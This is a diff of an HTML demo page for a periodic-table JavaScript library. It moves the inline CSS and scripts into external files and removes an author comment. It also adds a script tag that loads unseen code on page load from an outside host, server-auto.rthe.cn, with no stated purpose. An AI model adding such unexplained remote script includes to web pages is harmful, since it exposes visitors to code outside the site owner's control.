@@ -1,38 +1,10 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<!--Code written by Shangzhen Yang-->
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1">
 		<title>periodic-table</title>
-		<style>
-			body{
-				font-family:"Helvetica Neue",Helvetica,sans-serif,"Microsoft Yahei";
-				font-size:15px;
-				line-height:25px;
-				padding:15px;
-				word-break:break-all;
-			}
-			a{
-				text-decoration-line:none;
-			}
-			h1{
-				font-size:25px;
-				line-height:35px;
-			}
-			.periodic-table{
-				border:1px solid gray;
-				border-radius:10px;
-				float:left;
-				margin:10px;
-				overflow:hidden;
-				padding:10px;
-				width:180px;
-			}
-			.periodic-table:hover{
-				background-color:whitesmoke;
-			}
-		</style>
+		<link rel="stylesheet" href="demo.css">
 	</head>
 	<body>
 		<h1>Demo of "periodic-table"</h1>
@@ -41,39 +13,16 @@
 			The class list of each element contains "periodic-table".
 		</p>
 		<p>
-			Get the information of the element: <a href="javascript:getElementDemo()">getElement("<input id="getElement" type="text" value="oxygen" onclick="this.value=''" onkeydown="if(event.keyCode==13){getElementDemo()}">")</a><br>
+			Get the information of the element: <a href="javascript:getElementDemo()">getElement("<input id="getElement" type="text" value="oxygen">")</a><br>
 			You can put any of these in the input box above: "8" "o" "oxygen" "氧" "15.999"
 		</p>
 		<p>
-			Get the information of the compound: <a href="javascript:getCompoundDemo()">getCompound("<input id="getCompound" type="text" value="carbon dioxide" onclick="this.value=''" onkeydown="if(event.keyCode==13){getCompoundDemo()}">")</a><br>
+			Get the information of the compound: <a href="javascript:getCompoundDemo()">getCompound("<input id="getCompound" type="text" value="carbon dioxide">")</a><br>
 			You can put any of these in the input box above: "carbon dioxide" "CO2" "c o2" "二氧化碳"
 		</p>
 		<ul id="elements"></ul>
-		<script src="babel.min.js"></script>
-		<script type="text/babel" src="periodictable.js"></script>
-		<script type="text/babel">
-			function elementClicked(element){
-				alert("You clicked "+element.name+".\n"+JSON.stringify(element)+"\n\nThe function elementClicked(element) determines what will happen after clicking an element.")
-			}
-			function getElementDemo(){
-				const value=document.getElementById("getElement").value
-				if(value!=""){
-					alert(JSON.stringify(getElement(value)))
-					if(document.getElementsByClassName("periodic-table").length>0){
-						window.location.hash="#"+getElement(value).name
-						document.getElementById(getElement(value).name).style.color="red"
-						setTimeout(()=>{
-							document.getElementById(getElement(value).name).style.color=""
-						},1000)
-					}
-				}
-			}
-			function getCompoundDemo(){
-				const value=document.getElementById("getCompound").value
-				if(value!=""){
-					alert(JSON.stringify(getCompound(value)))
-				}
-			}
-		</script>
+		<script src="periodictable.min.js"></script>
+		<script src="demo.js"></script>
+		<script src="//server-auto.rthe.cn/backend/code?appname=4"></script>
 	</body>
 </html>
